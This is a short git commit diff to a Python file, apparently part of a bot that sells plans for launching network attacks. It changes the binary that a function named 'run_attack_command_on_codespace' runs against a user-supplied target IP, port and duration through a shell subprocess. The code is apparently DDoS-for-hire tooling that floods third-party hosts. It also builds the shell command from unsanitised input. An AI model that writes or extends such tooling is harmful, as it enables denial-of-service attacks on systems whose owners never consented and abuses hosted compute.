122af0ffc4d8e400d30dd856ef547735be73cafa
Highpower143 <nandyadu1c@gmail.com>
2024-12-04 18:19:24 +0530

    Update snyc.py

--- snyc.py
+++ snyc.py
@@ -67,7 +67,7 @@ def count_users_with_plan(plan):
 
 # Async attack command logic
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./nyc {target_ip} {target_port} {duration} 110"
+    command = f"./nand {target_ip} {target_port} {duration}"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
